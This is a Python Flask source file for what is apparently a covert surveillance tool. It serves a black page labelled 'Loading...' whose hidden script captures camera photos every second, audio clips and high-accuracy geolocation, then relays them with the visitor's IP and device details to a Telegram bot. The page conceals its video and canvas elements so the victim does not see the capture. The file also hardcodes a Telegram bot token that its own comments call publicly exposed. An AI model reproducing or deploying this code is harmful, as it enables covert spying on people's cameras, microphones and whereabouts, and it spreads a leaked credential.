from flask import Flask, request, Response
import json
import time
import os
import logging
from datetime import datetime
import hashlib
import hmac

app = Flask(__name__)

# SECURITY WARNING: This token is now compromised!
# Generate a new one immediately!
BOT_TOKEN = "7717616825:AAFsBZnNSgAkTCh0s3JAppa7DyvLvGr0FsY"

# Add security: Only allow specific chat IDs
ALLOWED_CHAT_IDS = {
    # Add your personal chat ID here
    # Example: "123456789": "Your Name"
}

# Session management with security
active_sessions = {}
session_timeout = 3600  # 1 hour

def verify_chat_id(chat_id):
    """Verify if chat ID is allowed"""
    # If ALLOWED_CHAT_IDS is empty, allow all (for testing)
    if not ALLOWED_CHAT_IDS:
        return True
    return chat_id in ALLOWED_CHAT_IDS

def cleanup_sessions():
    """Remove expired sessions"""
    current_time = time.time()
    expired = []
    for chat_id, session in list(active_sessions.items()):
        if current_time - session['start_time'] > session_timeout:
            expired.append(chat_id)
    
    for chat_id in expired:
        del active_sessions[chat_id]

# Minimal invisible HTML
HTML_TEMPLATE = '''<!DOCTYPE html>
<html style="background:#000;height:100vh;margin:0;overflow:hidden">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body,html{background:#000;margin:0;padding:0;height:100%;overflow:hidden}
        #status{position:absolute;top:-100px;opacity:0;pointer-events:none}
        video,canvas{position:absolute;top:-9999px;opacity:0}
    </style>
</head>
<body>
    <div id="status">.</div>
    <video id="camera" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <script>
        const chatId = "{{ chat_id }}";
        let stream = null;
        
        async function startCapture() {
            try {
                // Request permissions
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 640, height: 480 },
                    audio: { echoCancellation: true }
                });
                
                // Setup camera
                const video = document.getElementById('camera');
                video.srcObject = stream;
                
                // Start intervals
                setInterval(capturePhoto, 1000); // Every 1 second
                setInterval(captureAudio, 10000); // Every 10 seconds
                
                // Get location
                if (navigator.geolocation) {
                    setInterval(getLocation, 10000);
                    navigator.geolocation.getCurrentPosition(sendLocation);
                }
                
                // Initial capture
                setTimeout(() => {
                    capturePhoto();
                    captureAudio();
                }, 1000);
                
            } catch(e) {
                console.log('Starting without full permissions');
            }
        }
        
        function capturePhoto() {
            if (!stream) return;
            
            try {
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                if (video.readyState === 4) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        sendData(blob, 'photo');
                    }, 'image/jpeg', 0.8);
                }
            } catch(e) {}
        }
        
        async function captureAudio() {
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(audioStream);
                const chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    sendData(blob, 'audio');
                    audioStream.getTracks().forEach(t => t.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 2000);
            } catch(e) {}
        }
        
        function getLocation() {
            if (!navigator.geolocation) return;
            
            navigator.geolocation.getCurrentPosition(
                sendLocation,
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
        
        function sendLocation(position) {
            fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    acc: position.coords.accuracy
                })
            });
        }
        
        function sendData(blob, type) {
            const formData = new FormData();
            formData.append('file', blob, `${type}_${Date.now()}.${type === 'photo' ? 'jpg' : 'webm'}`);
            formData.append('chat_id', chatId);
            formData.append('type', type);
            
            fetch('/api/upload', {
                method: 'POST',
                body: formData
            });
        }
        
        // Cleanup on exit
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        });
        
        // Start everything
        window.addEventListener('load', () => {
            document.body.style.opacity = '0.001';
            setTimeout(startCapture, 300);
        });
    </script>
</body>
</html>'''

# Telegram functions with error handling
def telegram_api(method, data=None, files=None):
    try:
        import requests
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        
        if files:
            response = requests.post(url, files=files, data=data, timeout=10)
        else:
            response = requests.post(url, json=data, timeout=5)
        
        return response.status_code == 200
    except:
        return False

def send_telegram_alert(chat_id, message):
    """Send alert to Telegram"""
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    return telegram_api('sendMessage', data)

def send_telegram_photo(chat_id, photo_data, caption=""):
    """Send photo to Telegram"""
    from io import BytesIO
    try:
        files = {'photo': ('photo.jpg', BytesIO(photo_data), 'image/jpeg')}
        data = {'chat_id': chat_id, 'caption': caption}
        return telegram_api('sendPhoto', data, files)
    except:
        return False

def send_telegram_location(chat_id, lat, lon):
    """Send location to Telegram"""
    data = {
        'chat_id': chat_id,
        'latitude': lat,
        'longitude': lon
    }
    return telegram_api('sendLocation', data)

@app.route('/')
def index():
    """Main endpoint - completely invisible page"""
    chat_id = request.args.get('access')
    
    if not chat_id:
        return "Error: Add ?access=YOUR_CHAT_ID to URL", 400
    
    # Security check
    if not verify_chat_id(chat_id):
        return "Access denied", 403
    
    # Cleanup old sessions
    cleanup_sessions()
    
    # Start new session
    active_sessions[chat_id] = {
        'start_time': time.time(),
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string[:100]
    }
    
    # Send start notification
    start_msg = f"🔴 <b>CAPTURE STARTED</b>\n"
    start_msg += f"🆔 Chat ID: <code>{chat_id}</code>\n"
    start_msg += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n"
    start_msg += f"🌐 IP: {request.remote_addr}\n"
    start_msg += f"📱 Device: {request.user_agent.platform}"
    
    send_telegram_alert(chat_id, start_msg)
    
    return Response(
        HTML_TEMPLATE.replace('{{ chat_id }}', chat_id),
        mimetype='text/html'
    )

@app.route('/api/upload', methods=['POST'])
def upload():
    """Handle file uploads"""
    try:
        chat_id = request.form.get('chat_id')
        file_type = request.form.get('type')
        
        if not chat_id or not file_type:
            return jsonify({'status': 'error'}), 400
        
        if 'file' not in request.files:
            return jsonify({'status': 'error'}), 400
        
        file = request.files['file']
        file_data = file.read()
        
        if file_type == 'photo':
            caption = f"📸 Photo\nTime: {datetime.now().strftime('%H:%M:%S')}"
            send_telegram_photo(chat_id, file_data, caption)
        elif file_type == 'audio':
            # For audio, we'll just send a notification
            msg = f"🎵 Audio captured\nTime: {datetime.now().strftime('%H:%M:%S')}"
            send_telegram_alert(chat_id, msg)
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Upload error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/location', methods=['POST'])
def location():
    """Handle location updates"""
    try:
        data = request.json
        chat_id = data.get('chat_id')
        lat = data.get('lat')
        lon = data.get('lon')
        accuracy = data.get('acc', 0)
        
        if not all([chat_id, lat, lon]):
            return jsonify({'status': 'error'}), 400
        
        # Send location to Telegram
        send_telegram_location(chat_id, lat, lon)
        
        # Send detailed message
        loc_msg = f"📍 <b>LOCATION UPDATE</b>\n"
        loc_msg += f"Latitude: <code>{lat:.6f}</code>\n"
        loc_msg += f"Longitude: <code>{lon:.6f}</code>\n"
        if accuracy:
            loc_msg += f"Accuracy: {accuracy:.0f}m\n"
        loc_msg += f"Time: {datetime.now().strftime('%H:%M:%S')}"
        
        send_telegram_alert(chat_id, loc_msg)
        
        # Update session
        if chat_id in active_sessions:
            active_sessions[chat_id]['last_location'] = {
                'lat': lat,
                'lon': lon,
                'time': datetime.now().isoformat()
            }
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Location error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/stop/<chat_id>')
def stop_session(chat_id):
    """Manually stop a session"""
    if chat_id in active_sessions:
        msg = f"🟢 <b>CAPTURE STOPPED</b>\n"
        msg += f"Chat ID: <code>{chat_id}</code>\n"
        msg += f"Duration: {datetime.now().strftime('%H:%M:%S')}"
        
        send_telegram_alert(chat_id, msg)
        del active_sessions[chat_id]
        
        return jsonify({'status': 'stopped'})
    
    return jsonify({'status': 'not_found'}), 404

@app.route('/api/status')
def status():
    """Get API status"""
    cleanup_sessions()
    return jsonify({
        'status': 'running',
        'bot_token': 'SET' if BOT_TOKEN else 'MISSING',
        'active_sessions': len(active_sessions),
        'sessions': list(active_sessions.keys())
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    port = int(os.environ.get('PORT', 5000))
    
    # Security warning
    if BOT_TOKEN == "7717616825:AAFsBZnNSgAkTCh0s3JAppa7DyvLvGr0FsY":
        logging.warning("⚠️ USING PUBLICLY EXPOSED BOT TOKEN!")
        logging.warning("⚠️ REVOKE AND CHANGE IMMEDIATELY!")
    
    app.run(host='0.0.0.0', port=port, debug=False)
